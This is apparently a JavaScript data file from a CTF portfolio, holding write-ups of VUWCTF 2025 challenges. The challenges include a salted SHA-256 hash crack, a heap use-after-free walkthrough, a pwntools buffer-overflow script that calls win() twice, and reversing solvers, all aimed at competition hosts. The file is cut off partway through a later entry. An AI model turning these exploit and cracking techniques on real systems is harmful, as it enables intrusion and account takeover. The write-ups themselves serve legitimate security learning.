const ctfData = {
    "VUWCTF 2025": {
        "rank": "26th place",
        "description": "University-level competition with emphasis on practical security challenges.",
        "challenges": [
            {
                "id": "automatoncsc",
                "title": "AutomatonCSC",
                "category": "Miscellaneous",
                "tags": [
                    "http"
                ],
                "writeup": "<p>Go to https://automatoncsc.challenges.2025.vuwctf.com/robots.txt/\nYou will find /robotnics_home_7x9k2m/\nthen just go to https://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/\nIn the source you will find another subdomain that leads to flag.txt\nhttps://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/flag.txt\nFlag: VuwCTF{We_love_you_NZCSC!!!}</p>\n"
            },
            {
                "id": "classy_people_dont_debug",
                "title": "Classy_People_Dont_Debug",
                "category": "Reverse Engineering",
                "tags": [
                    "stack",
                    "wireshark",
                    "shark"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>We started with basic file analysis using <code>checksec</code>:</p>\n<p>Bash</p>\n<pre><code class=\"\">Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\n</code></pre>\n<p>Running <code>strings</code> revealed aggressive environment scanning. The binary searches for strings like <code>gdb</code>, <code>frida</code>, <code>strace</code>, <code>wireshark</code>, and <code>ida</code> in <code>/proc</code> and loaded libraries. This confirmed that running the binary would likely trigger a trap or fake execution path.</p>\n<h3>2. Static Analysis</h3>\n<p>We opened the binary in <strong>Binary Ninja</strong> to analyze the control flow.</p>\n<h4>The \"Minefield\" (Anti-Debug)</h4>\n<p>The <code>.rodata</code> section contained a list of forbidden tools (<code>0x404022</code> - <code>0x40410b</code>). The entry point logic verified the environment against these strings. If any were found, the program would likely alter its state or exit.</p>\n<h4>The Main Verification Loop</h4>\n<p>We located the main logic by tracing the \"Correct!\" string (<code>0x404437</code>). This led us to a loop in <code>main</code> that iterates <strong>33 times</strong> (length of the flag).</p>\n<p>The loop performed the following operations:</p>\n<p>1. <strong>Extraction:</strong> It extracted a byte from a large data blob at <code>0x404180</code> using a <strong>stride of 6</strong> (e.g., <code>blob[i * 6]</code>).</p>\n<p>2. <strong>Transformation:</strong> It passed the index <code>i</code> and the extracted byte to a function <code>sub_402f88</code>.</p>\n<p>3. <strong>Comparison:</strong> The result of the transformation was compared against the user's input character.</p>\n<h4>Reversing the Math (<code>sub_402f88</code>)</h4>\n<p>The transformation function <code>sub_402f88</code> was obfuscated with helper functions for basic arithmetic (<code>sub_4038c0</code> for <code>*</code>, <code>sub_403aaa</code> for <code>^</code>, etc.). By analyzing the arguments, we reconstructed the equation:</p>\n<p>Plaintext</p>\n<pre><code class=\"\">FlagChar = EncryptedByte ^ Term1 ^ Term2 ^ Term3\n</code></pre>\n<p>Where:</p>\n<ul>\n<li><code>EncryptedByte</code> = <code>blob[i * 6]</code></li>\n<li><code>Term1</code> = <code>(i * 13) + 193</code></li>\n<li><code>Term2</code> = <code>(i * 5) + 163</code></li>\n<li><code>Term3</code> = <code>SBox[i % 64]</code> (Looked up from a secondary blob at <code>0x404120</code>)</li>\n</ul>\n<h3>3. The Solution</h3>\n<p>Since the logic was deterministic and relied only on the index <code>i</code> and hardcoded data blobs, we wrote a Python script to emulate the verification function and generate the flag.</p>\n<p><strong>Solver Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">&lt;h2&gt;VuwCTF 'Classy' Solver&lt;/h2&gt;\n<p>&lt;h2&gt;1. The S-Box (Data at 0x404120)&lt;/h2&gt;\nsbox = [\n    0x10, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x90, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xfa, 0x0f,\n    0x11, 0x21, 0x31, 0x41, 0x51, 0x61, 0x71, 0x81, 0x92, 0xa2, 0xb2, 0xc2, 0xd2, 0xe2, 0xf2, 0x02,\n    0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x94, 0xa4, 0xb4, 0xc4, 0xd4, 0xe4, 0xf4, 0x04,\n    0x15, 0x25, 0x35, 0x45, 0x55, 0x65, 0x75, 0x85, 0x96, 0xa6, 0xb6, 0xc6, 0xd6, 0xe6, 0xf6, 0x06\n]</p>\n<p>&lt;h2&gt;2. The Encrypted Blob (Data at 0x404180)&lt;/h2&gt;\nencrypted_blob = bytes([\n    0x24, 0x41, 0x44, 0x64, 0x45, 0x5b, 0x31, 0x56, 0x22, 0x69, 0x5d, 0x58, \n    0x32, 0x16, 0x7f, 0x5d, 0x5e, 0x90, 0x5d, 0x0b, 0x5c, 0x58, 0x54, 0x71, \n    0x43, 0x5a, 0xba, 0x5b, 0x66, 0x58, 0x9e, 0xbc, 0x4c, 0x58, 0x5a, 0x6b, \n    0xc2, 0x52, 0x5b, 0x6f, 0x79, 0x03, 0x24, 0x63, 0x5f, 0x69, 0x03, 0x19, \n    0x17, 0x4d, 0x6b, 0x1d, 0x6f, 0xa5, 0x3f, 0x58, 0x6c, 0x60, 0x44, 0xa2, \n    0x53, 0x64, 0x60, 0x44, 0xa2, 0x62, 0x18, 0x6d, 0x43, 0x67, 0x61, 0x76, \n    0x3f, 0x61, 0x65, 0x7f, 0x60, 0xb3, 0x0d, 0x66, 0x8e, 0x6f, 0xb2, 0xa1, \n    0x05, 0x84, 0x69, 0xa4, 0xb3, 0xfe, 0x16, 0x61, 0xb4, 0xa3, 0xfe, 0xd5,\n    0x00, 0x45, 0xa4, 0xf7, 0xe6, 0xf9, 0x3e, 0x94, 0xe7, 0xfe, 0xf9, 0x98, \n    0x38, 0xfa, 0xf9, 0xbc, 0x9b, 0x7e, 0x9f, 0xe1, 0xbc, 0x9b, 0x7e, 0x76,\n    0xa3, 0xbe, 0xbd, 0x70, 0x44, 0x71, 0x98, 0xbf, 0x42, 0x5a, 0x77, 0x00, \n    0xd1, 0x79, 0x5b, 0x60, 0x71, 0x8e, 0x0f, 0x41, 0x76, 0x87, 0x8c, 0x95, \n    0x2f, 0x86, 0x87, 0xf4, 0x85, 0xaa, 0xb2, 0x95, 0xe2, 0x8b, 0x88, 0x89, \n    0xeb, 0xea, 0xcb, 0x88, 0x89, 0x6e, 0xbd, 0xc3, 0x88, 0x89, 0x6e, 0x36,\n    0x8f, 0xed, 0x8e, 0x13, 0x05, 0x10, 0x9f, 0x8e, 0x03, 0x0d, 0x10, 0x03,\n    0xbf, 0x09, 0x0b, 0x26, 0x31, 0x5c, 0x5b, 0x03, 0x16, 0x01, 0x5c, 0x57,\n    0x4c, 0x05, 0x04, 0x53, 0x42, 0x99\n])</p>\n<p>flag = \"\"</p>\n<p>for i in range(33):\n    enc_byte = encrypted_blob[i * 6]\n    term1 = (i * 13) + 193\n    term2 = (i * 5) + 163\n    term3 = sbox[i % 64]</p>\n<p># Decrypt\n    decrypted_char = (enc_byte ^ term1 ^ term2 ^ term3) &amp; 0xFF\n    flag += chr(decrypted_char)</p>\n<p>print(f\"Flag: {flag}\")\n</code></pre></p>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{very_classy_d0'nt_6ou_s33}</code></p>\n"
            },
            {
                "id": "delicious-cooking",
                "title": "Delicious Cooking",
                "category": "Cryptography",
                "tags": [
                    "crack"
                ],
                "writeup": "<h4><strong>1. Reconnaissance</strong></h4>\n<p>First, we searched the provided database dump for the target username, <code>meatballfan19274</code>.</p>\n<ul>\n<li><strong>User:</strong> <code>meatballfan19274</code></li>\n<li><strong>Hash:</strong> <code>09be2259e0224f41b96b633b73e7138b50b4be0a1ae20c0eb6a7434e8fc47303</code></li>\n<li><strong>Salt:</strong> <code>334aa758c52bb2f862f1607ff098e954</code></li>\n<li><strong>Security Hint:</strong> \"I refuse to use security questions for security reasons\"</li>\n</ul>\nThe security hint for this specific user was unhelpful. However, because this is a database dump, we can look for patterns across other users.\n<h4><strong>2. Pattern Analysis (The \"Shared Hash\" Vulnerability)</strong></h4>\n<p>We searched for other users in the database who had the <strong>exact same password hash</strong> (<code>09be...</code>) and <strong>salt</strong> (<code>334aa...</code>). If the hash and salt are identical, the password must be identical.</p>\n<p>We found several users sharing this hash, which gave us new security hints to analyze:</p>\n<p>1. <strong><code>steaksaucer28087</code>:</strong> \"Anyone can cook\"</p>\n<ul>\n<li><strong><code>icecreammaniac54990</code>:</strong> \"Anyone can cook\"</li>\n<li><strong><code>sodageek66653</code>:</strong> \"Anyone can cook\"</li>\n<li><strong><code>lasangelover47954</code>:</strong> <strong>\"fav movie + bank pin\"</strong></li>\n</ul>\n<h4><strong>3. Deduction</strong></h4>\n<p>The hints provided the pieces needed to construct the password:</p>\n<ul>\n<li><strong>\"fav movie\":</strong> The phrase \"Anyone can cook\" is the famous motto from the Pixar movie <strong>_Ratatouille_</strong>. Other users in the database also used quotes from this movie (e.g., \"Change is nature, dad\" and \"One can get too familiar with vegetables, you know\" ).</li>\n<li><strong>\"bank pin\":</strong> This implies a 4-digit number appended to the movie title.</li>\n</ul>\n<strong>Hypothesis:</strong> The password is likely <code>ratatouille</code> followed by 4 digits (e.g., <code>ratatouille0000</code> to <code>ratatouille9999</code>).\n<h4><strong>4. Exploit (Cracking the Hash)</strong></h4>\n<p>We performed a targeted brute-force attack using the derived pattern.</p>\n<ul>\n<li><strong>Attack Mode:</strong> Dictionary/Mask Attack</li>\n<li><strong>Candidates:</strong> <code>ratatouille0000</code> - <code>ratatouille9999</code></li>\n<li><strong>Salt Interpretation:</strong> The 32-character salt was hex-encoded. It needed to be decoded into raw bytes before hashing.</li>\n<li><strong>Hash Algo:</strong> SHA-256 (Mode 1410: <code>sha256($pass.$salt)</code>)</li>\n</ul>\n<strong>The Winning Combination:</strong>\n<ul>\n<li><strong>Candidate:</strong> <code>ratatouille6281</code></li>\n<li><strong>Salt (Hex-decoded):</strong> <code>0x334aa758c52bb2f862f1607ff098e954</code></li>\n</ul>\n<h4><strong>5. Flag</strong></h4>\n<p>The password for <code>meatballfan19274</code> is:</p>\n<p><strong><code>ratatouille6281</code></strong></p>\n"
            },
            {
                "id": "fortune-cookies",
                "title": "Fortune-Cookies",
                "category": "Miscellaneous",
                "tags": [
                    "http",
                    "cookie",
                    "crack"
                ],
                "writeup": "<h4>Challenge Description</h4>\n<p>> \"I'm really craving that fortune cookie feeling when you crack one open and read a message of 512 octets or fewer. I always need the best fortune, so I end up eating dozens of sugar-filled cookies at a time. Can you help?\"\n> \n> <strong>Connect:</strong> <code>nc fortune-cookie.challenges.2025.vuwctf.com 17</code></p>\n<h4>Reconnaissance & Analysis</h4>\n<p>The challenge provides a hostname and a specific port: <strong>17</strong>.</p>\n<p>1. <strong>Port Analysis:</strong> A quick check of standard ports reveals that TCP/UDP Port 17 is reserved for the <strong>Quote of the Day (QOTD)</strong> protocol (defined in <a href=\"https://tools.ietf.org/html/rfc865\" target=\"_blank\">RFC 865</a>).</p>\n<p>2. <strong>Protocol Behavior:</strong> The QOTD protocol is very simple: when a client connects, the server sends a short message (limited to 512 characters/octets) and immediately closes the connection.</p>\n<p>3. <strong>The Clue:</strong> The description mentions \"eating dozens\" of cookies to find the \"best fortune.\" This suggests that the server pulls from a randomized list of quotes, and the flag is simply one rare entry in that list.</p>\n<h4>Solution</h4>\n<p>To get the flag, we don't need to exploit a vulnerability. We simply need to automate \"eating\" the cookies (connecting repeatedly) until the flag is served.</p>\n<p>We can achieve this with a simple Bash one-liner that loops the <code>netcat</code> connection and <code>greps</code> for the flag format.</p>\n<p><strong>Exploit Script (Bash):</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">while true; do \n    nc fortune-cookie.challenges.2025.vuwctf.com 17 | grep \"VuwCTF{\" &amp;&amp; break\ndone\n</code></pre>\n<p><strong>Execution:</strong> The script loops infinitely. Most connections return a standard fortune cookie quote and are ignored by <code>grep</code>. Eventually, the server returns the flag, <code>grep</code> prints it to the console, and the loop breaks.</p>\n<h4>The Flag</h4>\n<p>Plaintext</p>\n<pre><code class=\"\">VuwCTF{om_nom_nom_bytes}\n</code></pre>\n"
            },
            {
                "id": "fruit-ninja",
                "title": "Fruit Ninja",
                "category": "Binary Exploitation",
                "tags": [
                    "heap",
                    "memory"
                ],
                "writeup": "<h3>1. Vulnerability Analysis</h3>\n<p>By analyzing the binary with GDB, we discovered two critical flaws:</p>\n<p>1. <strong>Dangling Pointer (UAF):</strong> When selecting <strong>Option 2 (Throw away fruit)</strong>, the program frees the memory chunk but fails to clear the pointer in the <code>fruit_basket</code> array. This allows us to access and edit \"freed\" memory.</p>\n<p>2. <strong>Heap Reuse:</strong> The <strong>Option 6 (Reset leaderboard)</strong> function allocates a new memory chunk of size <code>0x24</code> (padded to <code>0x30</code>). This is the exact same size as a \"Fruit\" chunk. Because the heap manager (glibc allocator) prioritizes recycling recently freed chunks (via the <code>tcache</code>), resetting the leaderboard will reuse the memory address of the most recently freed fruit.</p>\n<p><strong>The Win Condition:</strong> The function <code>perform_special_action</code> (Option 5) checks if the data inside the <code>leaderboard</code> matches the string <strong>\"Admin\"</strong>.</p>\n<h3>2. The Exploit Strategy</h3>\n<p>We can trick the program into making the <code>leaderboard</code> and our <code>fruit_basket</code> point to the <strong>same memory address</strong>. This allows us to use the \"Edit Fruit\" feature to overwrite the <code>leaderboard</code> data with \"Admin\".</p>\n<h3>3. Manual Execution Steps</h3>\n<p>Here is the exact sequence of inputs to solve the challenge manually (works on both local binary and remote server).</p>\n<h4>Step 1: Slice a Fruit (Allocation)</h4>\n<p>We create a fruit to reserve a chunk of memory on the heap.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>1</code></li>\n<li><strong>Fruit Name:</strong> <code>Trash</code> (Any name works here)</li>\n<li><strong>Points:</strong> <code>1</code></li>\n</ul>\n<h4>Step 2: Throw Away Fruit (Free)</h4>\n<p>We free the fruit we just created. The memory is released to the \"recycle bin,\" but our pointer to it (Index 0) remains active (dangling).</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>2</code></li>\n<li><strong>Index:</strong> <code>0</code></li>\n</ul>\n<h4>Step 3: Reset Leaderboard (Aliasing)</h4>\n<p>We choose to reset the leaderboard. The program requests memory. The allocator notices the chunk we just freed in Step 2 fits perfectly, so it gives that specific memory address to the <code>leaderboard</code>.</p>\n<ul>\n<li><strong>Crucial State:</strong> <code>fruit_basket[0]</code> and <code>leaderboard</code> now point to the <strong>same address</strong>.</li>\n<li><strong>Menu Choice:</strong> <code>6</code></li>\n</ul>\n<h4>Step 4: Overwrite Data</h4>\n<p>We use the \"Edit\" feature on the dangling fruit pointer. Since it points to the same place as the leaderboard, we are actually editing the leaderboard.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>4</code></li>\n<li><strong>Index:</strong> <code>0</code></li>\n<li><strong>New Name:</strong> <code>Admin</code></li>\n<li>_Note: This must be exact. Case-sensitive._</li>\n</ul>\n<h4>Step 5: Trigger Victory</h4>\n<p>Now that the leaderboard contains the string \"Admin\", we run the check.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>5</code></li>\n</ul>\n<strong>Output:</strong>\n<p>Plaintext</p>\n<pre><code class=\"\">Admin Welcome!\nFlag: VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}\n</code></pre>\n<h3>Summary</h3>\n<p>This challenge is a textbook example of <strong>Heap Aliasing</strong>. By understanding that <code>malloc</code> recycles memory and that the program didn't clean up its pointers (<code>fruit_basket[0]</code>), we were able to control an internal program structure (<code>leaderboard</code>) using user-accessible controls (<code>edit_fruit</code>).</p>\n"
            },
            {
                "id": "missing-function",
                "title": "Missing Function",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "stack",
                    "assembly",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a binary (<code>flag_verifier</code>) that asks for a flag input. Static analysis reveals that the validation logic is not present in the <code>.text</code> section. Instead, the program allocates executable memory, copies a blob of data into it, and executes that data as a function.</p>\n<h3>Step 1: Static Analysis</h3>\n<p>Opening the binary in a decompiler (Ghidra/Binary Ninja/IDA) reveals the following control flow in <code>main</code>:</p>\n<p>1. User input is read via <code>getline</code>.</p>\n<p>2. <code>mmap</code> is called to allocate a memory region with permissions <code>7</code> (<strong>RWX</strong> - Read, Write, Execute).</p>\n<p>3. <code>memcpy</code> moves a chunk of bytes from a global data section (<code>0x404020</code>) into this new memory.</p>\n<p>4. The program casts the allocated memory address to a function pointer and calls it: <code>rax_2(input_string, input_length)</code>.</p>\n<p>This confirms the binary is a <strong>Shellcode Runner</strong>. To solve it, we must analyze the code generated at runtime.</p>\n<h3>Step 2: Dynamic Analysis (Bypassing PIE)</h3>\n<p>Running <code>checksec</code> reveals that <strong>PIE (Position Independent Executable)</strong> is enabled, meaning memory addresses are randomized at every run. We cannot simply break at the static offset.</p>\n<p><strong>Strategy:</strong></p>\n<p>1. Run the program in GDB and let it load.</p>\n<p>2. Interrupt execution while it waits for input.</p>\n<p>3. Find the base address and calculate the offset to the shellcode invocation.</p>\n<p><strong>GDB Steps:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">gdb ./flag_verifier\n(gdb) start\n(gdb) continue\n&lt;h2&gt;Program waits for input... Press Ctrl+C&lt;/h2&gt;\n^C\n(gdb) info proc mappings\n</code></pre>\n<p>_We identified the Base Address (e.g., <code>0x555555554000</code>)._</p>\n<p>We located the <code>call</code> instruction at offset <code>0x134c</code>. <strong>Breakpoint Address:</strong> <code>Base Address + 0x134c</code>.</p>\n<h3>Step 3: Analyzing the Shellcode</h3>\n<p>After setting the breakpoint and providing dummy input (<code>AAAA</code>), we stepped (<code>si</code>) into the mapped memory.</p>\n<p>Disassembling the shellcode (<code>x/20i $pc</code>) revealed the following logic:</p>\n<h4>1. Length Check</h4>\n<p>Code snippet</p>\n<pre><code class=\"\">cmpl   $0x1d,-0x4c(%rbp)  ; 0x1d = 29 decimal\nje     ...\n</code></pre>\n<p>The flag must be exactly <strong>29 characters</strong> long.</p>\n<h4>2. Data Loading</h4>\n<p>The code loads several 64-bit integers onto the stack using <code>movabs</code>. These represent the encrypted flag bytes in <strong>Little Endian</strong>.</p>\n<ul>\n<li><code>0x9ff8e6a5c0d784d5</code></li>\n<li><code>0xecc29cfad3aeedcf</code></li>\n<li>...and others.</li>\n</ul>\n<h4>3. Key Loading</h4>\n<p>The code initializes a rolling XOR key:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">movw   $0xf183,-0x33(%rbp)  ; Stores bytes 0x83, 0xF1\nmovb   $0xa0,-0x31(%rbp)    ; Stores byte  0xA0\n</code></pre>\n<p>Key: <code>[0x83, 0xF1, 0xA0]</code></p>\n<h4>4. Decryption Loop</h4>\n<p>The loop logic was identified as:</p>\n<p>1. Load encrypted byte.</p>\n<p>2. Load key byte (cycling through the 3-byte key).</p>\n<p>3. XOR them (<code>encrypted ^ key</code>).</p>\n<p>4. Compare result with user input.</p>\n<h3>Step 4: Solving</h3>\n<p>We extracted the encrypted bytes and the key from the assembly and wrote a Python script to replicate the XOR decryption.</p>\n<p><strong>Solution Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">#!/usr/bin/env python3\n<p>&lt;h2&gt;Key extracted from assembly (Little Endian: 0xf183 -&gt; 83 f1)&lt;/h2&gt;\n&lt;h2&gt;Key sequence: 83 F1 A0&lt;/h2&gt;\nkey = [0x83, 0xF1, 0xA0]</p>\n<p>&lt;h2&gt;Encrypted chunks extracted from 'movabs' instructions&lt;/h2&gt;\n&lt;h2&gt;We convert them to bytes (Little Endian)&lt;/h2&gt;\nchunks = [\n    0x9ff8e6a5c0d784d5,\n    0xecc29cfad3aeedcf,\n    0xc6aee0c99decc29c, # Note: This chunk overlapped in memory, \n    0x8cedcf98f7c39ff6  # but we reconstruct the stream based on offsets\n]</p>\n<p>&lt;h2&gt;Reconstructing the raw byte stream&lt;/h2&gt;\ndata = bytearray()\ndata.extend(chunks[0].to_bytes(8, 'little'))\ndata.extend(chunks[1].to_bytes(8, 'little')[:5]) # Take first 5 bytes to reach next offset\ndata.extend(chunks[2].to_bytes(8, 'little'))\ndata.extend(chunks[3].to_bytes(8, 'little'))</p>\n<p>&lt;h2&gt;Decrypt&lt;/h2&gt;\nflag = \"\"\nfor i in range(29): # We know length is 29\n    decrypted_char = data[i] ^ key[i % 3]\n    flag += chr(decrypted_char)</p>\n<p>print(f\"Flag: {flag}\")\n</code></pre></p>\n<h3>Flag</h3>\n<p><code>VuwCTF{non_symbolic_function}</code></p>\n"
            },
            {
                "id": "tokaido",
                "title": "Tokaido",
                "category": "Binary Exploitation",
                "tags": [
                    "pwn",
                    "buffer",
                    "overflow",
                    "rop",
                    "stack",
                    "memory"
                ],
                "writeup": "<h3>1. Analysis</h3>\n<p>We are provided with a 64-bit ELF binary <code>tokaido</code> and its source code <code>tokaido.c</code>.</p>\n<h4>Source Code Review</h4>\n<p>The <code>main</code> function contains two critical elements:</p>\n<p>1. <strong>Memory Leak:</strong> It prints the address of the <code>main</code> function itself (<code>printf(\"funny number: %p\\n\", main);</code>). This allows us to bypass ASLR/PIE protections.</p>\n<ul>\n<li><strong>Buffer Overflow:</strong> It uses <code>gets(buffer)</code> to read into a 16-byte buffer. Since <code>gets</code> does not check input length, we can overwrite the stack.</li>\n</ul>\nThe <code>win</code> function has a specific logic gate:\n<p>C</p>\n<pre><code class=\"\">void win() {\n    puts(\"you win\");\n    if (attempts++ &gt; 0){\n        // prints flag...\n    } else {\n        puts(\"not attempted\");\n    }\n}\n</code></pre>\n<p>The flag is only printed if <code>attempts > 0</code>. Since <code>attempts</code> starts at 0, calling <code>win()</code> once is insufficient. We must execute <code>win()</code> <strong>twice</strong> within the same exploit chain.</p>\n<h3>2. Exploitation Strategy</h3>\n<p>To exploit this, we use a <strong>Return-Oriented Programming (ROP)</strong> approach:</p>\n<p>1. <strong>Calculate Offsets:</strong> We determine the static distance between <code>main</code> and <code>win</code> in the binary.</p>\n<ul>\n<li>Static <code>main</code>: <code>0x12ce</code></li>\n<li>Static <code>win</code>: <code>0x1229</code></li>\n</ul>\n2. <strong>Bypass ASLR:</strong> Capture the \"funny number\" leak at runtime, calculate the binary's base address, and determine the dynamic address of <code>win</code>.\n<p>3. <strong>Construct Payload:</strong></p>\n<ul>\n<li><strong>Padding:</strong> 16 bytes (Buffer) + 8 bytes (Saved RBP) = <strong>24 bytes</strong>.</li>\n<li><strong>Return Address 1:</strong> Address of <code>win</code> (Increments <code>attempts</code> to 1).</li>\n<li><strong>Return Address 2:</strong> Address of <code>win</code> (Checks <code>attempts > 0</code> and prints flag).</li>\n</ul>\n<h3>3. Exploit Script</h3>\n<p>Here is the final python script using <code>pwntools</code> to solve the challenge remotely.</p>\n<p>Python</p>\n<pre><code class=\"\">from pwn import *\n<p>&lt;h2&gt;Context setup&lt;/h2&gt;\nexe = './tokaido'\nelf = ELF(exe)\ncontext.binary = elf</p>\n<p>&lt;h2&gt;Connect to server&lt;/h2&gt;\n&lt;h2&gt;r = process(exe) # For local testing&lt;/h2&gt;\nr = remote(\"tokaido.challenges.2025.vuwctf.com\", 9983)</p>\n<p>&lt;h2&gt;1. Parse the Leak&lt;/h2&gt;\nr.recvuntil(b\"funny number: \")\nleak = int(r.recvline().strip(), 16)\nlog.info(f\"Leaked main: {hex(leak)}\")</p>\n<p>&lt;h2&gt;2. Calculate Base Address&lt;/h2&gt;\n&lt;h2&gt;Formula: Base = Leak - Static_Main_Offset&lt;/h2&gt;\nelf.address = leak - elf.symbols['main']\nlog.success(f\"Calculated Binary Base: {hex(elf.address)}\")</p>\n<p>&lt;h2&gt;3. Construct Payload&lt;/h2&gt;\n&lt;h2&gt;We need to call win() TWICE.&lt;/h2&gt;\n&lt;h2&gt;Layout: [Padding 24B] + [Address of Win] + [Address of Win]&lt;/h2&gt;\npayload = b\"A\" * 24\npayload += p64(elf.symbols['win']) # First call: attempts -&gt; 1\npayload += p64(elf.symbols['win']) # Second call: prints flag</p>\n<p>&lt;h2&gt;4. Send &amp; Win&lt;/h2&gt;\nr.sendline(payload)\nr.interactive()\n</code></pre></p>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{eastern_sea_route}</code></p>\n"
            },
            {
                "id": "ng\u0101wari-vm",
                "title": "ng\u0101wari-vm",
                "category": "Reverse Engineering",
                "tags": [
                    "overflow",
                    "stack",
                    "reverse",
                    "assembly"
                ],
                "writeup": "<h3>1. Initial Analysis</h3>\n<p>We start by inspecting the provided files. <code>ngawari_vm</code> is the executable, and <code>flag_checker.txt</code> contains unintelligible text data.</p>\n<p>Running <code>strings</code> on the binary reveals that it is a \"generalized, programmable input checker\". Key strings include:</p>\n<ul>\n<li><code>Ngawari VM - A generalized, programmable input checker</code></li>\n<li><code>Required first line of file missing</code></li>\n<li><code>Input accepted!</code></li>\n<li><code>Stack overflow</code> / <code>Stack underflow</code></li>\n</ul>\nThis suggests the binary implements a stack-based virtual machine that reads <code>flag_checker.txt</code> as a set of rules.\n<h3>2. Reverse Engineering the VM logic</h3>\n<p>Using <code>gdb</code> (GNU Debugger), we analyzed the <code>accept_input</code> function, which is the core execution loop. The disassembly revealed that the VM operates as a <strong>Pushdown Automaton (PDA)</strong>.</p>\n<p>A PDA is a theoretical machine that uses a <strong>Stack</strong> and a <strong>State</strong> to decide valid transitions. The disassembly showed that for every input character, the VM performs the following check:</p>\n<p>\u03b4(CurrentState,InputChar,PopStack)\u2192(NextState,PushString)</p>\n<p>Specifically, the VM reads instructions from <code>flag_checker.txt</code> and looks for a line that matches:</p>\n<p>1. <strong>Current State:</strong> The VM's current state byte.</p>\n<p>2. <strong>Input Character:</strong> The character you just typed.</p>\n<p>3. <strong>Stack Top:</strong> The character popped from the top of the stack.</p>\n<p>If a match is found, the VM transitions to the <strong>Next State</strong> and pushes a defined string onto the stack.</p>\n<h3>3. Decoding <code>flag_checker.txt</code></h3>\n<p>With the logic understood, we can parse <code>flag_checker.txt</code>.</p>\n<h4>The Header</h4>\n<p>The first line of the file is <code>aBw</code>.</p>\n<ul>\n<li><code>a</code>: <strong>Initial State</strong>.</li>\n<li><code>B</code>: <strong>Initial Stack Symbol</strong> (The stack starts with this char).</li>\n<li><code>w</code>: <strong>Accepting State</strong> (The state we must reach to win).</li>\n</ul>\n<h4>The Instructions</h4>\n<p>Subsequent lines follow a specific format. Take the line <code>i_GoPHER</code> as an example:</p>\n<ul>\n<li><code>i</code>: <strong>Current State</strong> required.</li>\n<li><code>_</code>: <strong>Input Character</strong> required.</li>\n<li><code>G</code>: <strong>Stack Pop</strong> required (Must be at the top of the stack).</li>\n<li><code>o</code>: <strong>Next State</strong>.</li>\n<li><code>PHER</code>: <strong>String to Push</strong>.</li>\n<li>_Note:_ The VM loops through this string and pushes characters. Effectively, the first character of the string (<code>P</code>) becomes the new top of the stack.</li>\n</ul>\n<h3>4. Solving the Automaton</h3>\n<p>The complexity of the stack operations makes manual solving impossible. We need to find a path from the start state <code>a</code> (with stack <code>['B']</code>) to the target state <code>w</code>.</p>\n<p>We can solve this using a Breadth-First Search (BFS) algorithm in Python. The script simulates the PDA, tracking the <code>(State, Stack)</code> tuple to find the correct path.</p>\n<h4>The Solver Script</h4>\n<p>Python</p>\n<pre><code class=\"\">import collections\n<p>def solve_vm():\n    # Load the bytecode\n    with open('flag_checker.txt', 'r') as f:\n        lines = [l.strip() for l in f.readlines() if l.strip()]</p>\n<p># Parse Header: aBw\n    # Init State: 'a', Init Stack: 'B', Target State: 'w'\n    header = lines[0]\n    init_state = header[0]\n    init_stack = (header[1],) # Represent stack as a tuple\n    target_state = header[2]</p>\n<p># Parse Transitions\n    transitions = []\n    for line in lines[1:]:\n        if len(line) &lt; 4: continue\n        # Format: [State][Input][Pop][NextState][PushStr...]\n        transitions.append({\n            'state': line[0],\n            'in_char': line[1],\n            'pop_char': line[2],\n            'next_state': line[3],\n            'push_str': line[4:] \n        })</p>\n<p># BFS Initialization\n    # Queue stores: (Current State, Current Stack Tuple, Path Taken)\n    queue = collections.deque([(init_state, init_stack, \"\")])\n    visited = set([(init_state, init_stack)])</p>\n<p>print(\"Searching for flag...\")</p>\n<p>while queue:\n        curr_state, curr_stack, history = queue.popleft()</p>\n<p># The stack cannot be empty for a valid move\n        if not curr_stack:\n            continue</p>\n<p># Get the top of the stack\n        top_of_stack = curr_stack[-1]\n        stack_body = curr_stack[:-1]</p>\n<p>for t in transitions:\n            # Check if this transition applies\n            if t['state'] == curr_state and t['pop_char'] == top_of_stack:</p>\n<p># Check for Win Condition\n                # The VM terminates input with a '^' char. \n                if t['in_char'] == '^':\n                    if t['next_state'] == target_state:\n                        return history # Return the path (the flag)\n                    continue</p>\n<p># Execute the move\n                # 1. Pop is already done (we separated top_of_stack)\n                # 2. Push the new string (reversed so first char is new top)\n                new_push = tuple(t['push_str'][::-1])\n                new_stack = stack_body + new_push\n                new_state = t['next_state']</p>\n<p># Add to queue if not visited\n                state_signature = (new_state, new_stack)\n                if state_signature not in visited:\n                    visited.add(state_signature)\n                    # Append the input char to our history\n                    queue.append((new_state, new_stack, history + t['in_char']))</p>\n<p>return \"Flag not found.\"</p>\n<p>print(f\"Flag: {solve_vm()}\")\n</code></pre></p>\n<h3>5. The Result</h3>\n<p>Running the solver simulates the machine steps and recovers the input string that satisfies the \"Accepting State\" condition.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">VuwCTF{VuwCTF_1s_s0_c00l_innit}\n</code></pre>\n"
            }
        ]
    },
    "Null CTF 2025": {
        "rank": "62nd place",
        "description": "Community-driven CTF with focus on real-world security scenarios.",
        "challenges": []
    },
    "MetaRed CTF 2025": {
        "rank": "66th place",
        "description": "Specialized competition focusing on red team operations and offensive security techniques.",
        "challenges": []
    },
    "BackdoorCTF 2025": {
        "rank": "79th place",
